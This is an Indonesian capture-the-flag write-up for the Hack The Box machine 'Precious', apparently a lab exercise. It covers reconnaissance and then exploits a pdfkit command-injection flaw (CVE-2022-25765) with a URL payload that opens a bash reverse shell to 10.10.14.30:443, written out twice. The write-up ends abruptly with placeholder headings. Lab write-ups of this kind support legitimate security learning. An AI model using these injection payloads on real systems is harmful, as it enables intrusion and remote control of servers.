# Precious 
**SOLVED : JAN 11 | 2023**
![Precious](https://user-images.githubusercontent.com/92077284/211991670-4b07aee9-b558-4b25-9b42-47e17659e981.png)

## Information Gathering
![image](https://user-images.githubusercontent.com/92077284/213347545-adaa6f23-5523-436a-a37d-9aa5c28a627a.png)  
![image](https://user-images.githubusercontent.com/92077284/211992854-535f66c3-a172-4997-9d7d-82a58bb42449.png)  
Pertama - tama lakukan proses **nmap** pada ip yang sudah diberikan pada web htb, hal ini berfungsi untuk memeriksa layanan yang tersedia dalam jaringan  
Didapati ada 2 port, yaitu port **22 dan 80**, serta alamat web yaitu precious.htb  
Disini disimpulkan bahwa **port 22** untuk akses ssh, dan **port 80** adalah penyedia webnya  
Untuk mengakses precious.htb diperlukan command `sudo vim /etc/hosts` untuk menambahkan `10.10.11.189 precious.htb`  
![image](https://user-images.githubusercontent.com/92077284/211993812-b3068588-4e9d-408d-af3d-45356d7fba78.png)  
Masuk ke **10.10.11.189**  
![image](https://user-images.githubusercontent.com/92077284/211994354-6a6245cb-f01b-4bde-8634-d19b03e707eb.png)  
Apabila dicoba isi 'http://google.com' maka akan menunjukan tampilan seperti ini, karena tertulis _Cannot load remote URL!_ maka saya coba untuk _serving http server_  
![image](https://user-images.githubusercontent.com/92077284/211995365-debd1424-dd52-41d1-a55e-4d5855cc7e37.png)
disini akan dilakukan hosting pada port 80 dengan ip yang sesuai dengan ip di **tun0**, agar nantinya dapat ditangkap oleh website  
![image](https://user-images.githubusercontent.com/92077284/211996025-da71de3e-fdf1-44f5-9b52-be06a30c0176.png)  
![image](https://user-images.githubusercontent.com/92077284/213347427-0cbe2aeb-7399-44cc-9ece-ac74a25d8131.png)  
Lalu coba masukan 'http://10.10.14.30:80' ke dalam website  
![image](https://user-images.githubusercontent.com/92077284/211996453-a4bd650a-8551-4b1d-bd86-c485a273c7d7.png)  
Didapati file pdf sebagai berikut, yang bila dibuka akan menampilkan list directory di tempat _serving http server_  
![image](https://user-images.githubusercontent.com/92077284/211996521-9d32d634-253e-4ae5-b2f6-144b1ce999dc.png)  
![image](https://user-images.githubusercontent.com/92077284/213354581-a64b7b8a-5786-406b-b3fa-3ae0ca537556.png)  
Setelah itu analisa file pdf menggunakan **exiftool**, file di analisa menggunakan tool ini karena saya ingin mengetahui meta data dari file atau ada hal yang mencurigakan dari file.   
![image](https://user-images.githubusercontent.com/92077284/211996948-fb392098-7706-4054-8e85-0d6e1068d64f.png)  
Disini saya memanfaatkan **pdfkit v0.8.6** sebagai celah untuk masuk kedalam sistem, pdfkit adalah _PDF document generation library_ untuk browser, yang fungsinya memudahkan browser membuat file, namun pada versi ini terdapat celah kerentanan dimana kita dapat melakukan _Command Injection_ karena URL tidak di sanitasi.  

**CVE-2022–25765** Source: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795  
Dari situ dapat dibuat sebuah _reverse shell_ dengan bantuan **Hack-Tools**  
**Hack-Tools** = https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi  
![image](https://user-images.githubusercontent.com/92077284/213356703-8097f1a2-5a5f-498d-9ece-69cbb88491eb.png)  

```
http://example.com/?name=#{'%20`sleep 5`'}
http://example.com/?name=#{'%20``'}
```
menjadi   
```
http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443 <&1'`'}
```
Untuk memulai tahapannya, pertama coba untuk _listen_ pada port 443  
![image](https://user-images.githubusercontent.com/92077284/213357167-d793b9f5-d2eb-4dfc-b7f7-adae4d6ca264.png)  
lalu buat _payload_ dan masukan kedalam website, untuk melakukan _command injection_  
```
http://example.com/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.30/443 <&1'`'}
```
![image](https://user-images.githubusercontent.com/92077284/213357672-62b90aeb-1762-418d-9e22-edc9fa001afb.png)  
lalu aktivitas akan terekam pada terminal yang tadi  




## a
## a
## a
## a
